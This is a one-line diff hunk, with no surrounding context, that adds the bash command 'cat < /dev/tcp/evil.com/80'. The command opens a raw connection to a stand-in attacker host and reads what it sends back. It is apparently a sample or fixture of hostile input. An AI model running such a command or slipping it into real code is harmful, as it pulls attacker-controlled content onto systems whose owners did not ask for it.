@@ -1,0 +1,1 @@
+cat < /dev/tcp/evil.com/80
